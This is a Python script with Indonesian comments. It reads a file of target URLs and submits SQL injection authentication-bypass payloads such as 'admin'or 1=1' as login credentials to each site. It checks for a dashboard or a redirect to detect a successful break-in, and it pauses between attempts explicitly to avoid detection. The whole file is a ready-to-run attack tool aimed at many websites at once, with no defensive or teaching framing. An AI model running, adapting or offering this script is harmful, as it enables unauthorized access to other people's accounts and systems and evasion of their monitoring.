import requests
from colorama import Fore, Style, init
import time

# Inisialisasi colorama
init(autoreset=True)

# Daftar username dan password dengan SQL injection
usernames = [
    '="or', 'admin\'or 1=1 or \'\'=\''
]

passwords = [
    '="or', 'admin\'or 1=1 or \'\'=\''
]

def login(login_url, username, password):
    with requests.Session() as session:
        payload = {
            'username': username,
            'password': password,
        }
        response = session.post(login_url, data=payload)
        return response

def brute_force_login(login_url, usernames, passwords):
    for username in usernames:
        for password in passwords:
            print(f"{Fore.RED}{Style.BRIGHT}Mencoba username: {username} dan password: {password}")
            response = login(login_url, username, password)
            if "Dashboard" in response.text or response.url != login_url:  # Ganti kondisi sesuai dengan indikasi login berhasil
                print(f"{Fore.GREEN}{Style.BRIGHT}Login berhasil dengan username: {username} dan password: {password}")
                return True
            time.sleep(1)  # Penundaan antara percobaan untuk menghindari deteksi
    print(f"{Fore.RED}{Style.BRIGHT}Tidak ada kombinasi yang berhasil")
    return False

def load_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
    return [url.strip() for url in urls]

if __name__ == "__main__":
    file_path = input(f"{Fore.RED}{Style.BRIGHT}Masukkan path file txt yang berisi URL: ")
    urls = load_urls_from_file(file_path)
    
    for url in urls:
        # Memeriksa apakah URL valid
        if not url.startswith('http://') and not url.startswith('https://'):
            print(f"{Fore.YELLOW}{Style.BRIGHT}URL tidak valid: {url}, melewatkan...")
            continue
        
        print(f"{Fore.RED}{Style.BRIGHT}Mencoba brute force login pada {url}...")
        if brute_force_login(url, usernames, passwords):
            break
    print(f"{Fore.RED}{Style.BRIGHT}Proses brute force selesai")